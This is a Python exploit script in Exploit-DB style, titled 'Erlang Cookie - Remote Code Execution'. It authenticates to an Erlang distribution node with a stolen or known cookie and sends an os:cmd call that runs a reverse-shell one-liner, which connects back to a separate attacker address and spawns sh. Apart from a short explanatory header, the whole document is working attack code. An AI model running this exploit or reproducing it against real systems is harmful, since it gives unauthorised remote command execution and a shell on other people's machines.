# Exploit Title: Erlang Cookie - Remote Code Execution
# Date: 2020-05-04
# Exploit Author: 1F98D
# Original Author: Milton Valencia (wetw0rk)
# Software Link: https://www.erlang.org/
# Version: N/A
# Tested on: Debian 9.11 (x64)
# References:
# https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/
#
# Erlang allows distributed Erlang instances to connect and remotely execute commands.
# Nodes are permitted to connect to eachother if they share an authentication cookie,
# this cookie is commonly called ".erlang.cookie"
#
#!/usr/local/bin/python3

import socket
from hashlib import md5
import struct
import sys

TARGET = "192.168.234.68"
PORT = 65000
COOKIE = "JPCGJCAEWHPKKPBXBYYB"
CMD = "python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((\"192.168.49.234\",80));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET, PORT))

name_msg  = b"\x00"
name_msg += b"\x15"
name_msg += b"n"
name_msg += b"\x00\x07"
name_msg += b"\x00\x03\x49\x9c"
name_msg += b"AAAAAA@AAAAAAA"

s.send(name_msg)
s.recv(5)                    # Receive "ok" message
challenge = s.recv(1024)     # Receive "challenge" message
challenge = struct.unpack(">I", challenge[9:13])[0]

print("Extracted challenge: {}".format(challenge))

challenge_reply  = b"\x00\x15"
challenge_reply += b"r"
challenge_reply += b"\x01\x02\x03\x04"
challenge_reply += md5(bytes(COOKIE, "ascii") + bytes(str(challenge), "ascii")).digest()

s.send(challenge_reply)
challenge_res = s.recv(1024)
if len(challenge_res) == 0:
    print("Authentication failed, exiting")
    sys.exit(1)

print("Authentication successful")

ctrl = b"\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00\x00\x00w\x00w\x03rex"
msg  = b'\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k'
msg += struct.pack(">H", len(CMD))
msg += bytes(CMD, 'ascii')
msg += b'jw\x04user'

payload = b'\x70' + ctrl + msg
payload = struct.pack('!I', len(payload)) + payload
print("Sending cmd: '{}'".format(CMD))
s.send(payload)
print(s.recv(1024))